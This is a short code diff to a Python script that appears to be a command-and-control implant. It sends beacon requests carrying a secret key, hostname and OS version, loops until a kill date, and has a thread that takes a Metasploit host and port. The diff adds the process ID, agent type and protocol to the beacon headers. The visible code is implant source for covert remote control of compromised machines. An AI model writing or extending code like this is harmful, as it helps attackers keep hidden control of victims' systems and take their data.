@@ -10,6 +10,7 @@ except:
     from commands import getoutput as check_output
 import ssl
 import socket
+from os import getpid
 from time import sleep
 from random import randint
 from sys import exit, argv
@@ -46,6 +47,9 @@ def request_headers(send_data):
     data += "Secret-Key: {}\r\n".format(SECRET_KEY)
     data += "Hostname: {}\r\n".format(HOSTNAME)
     data += "OS: {}\r\n".format(OS_VERSION)
+    data += "PID: {}\r\n".format(PID)
+    data += "TYPE: {}\r\n".format(TYPE)
+    data += "PROTOCOL: {}\r\n".format(PROTOCOL)
     data += "Data: {}\r\n\r\n".format(cmd_formatter(send_data))
     return data
 
@@ -200,6 +204,9 @@ def cmd_thread(msfhost, msfport):
 ################################################
 HOSTNAME        = node().strip()
 OS_VERSION      = system().strip() + release().strip()
+PID             = getpid()
+TYPE            = "python"
+PROTOCOL        = "HTTPS"
 
 while KILL_DATE > datetime.now():
     try:
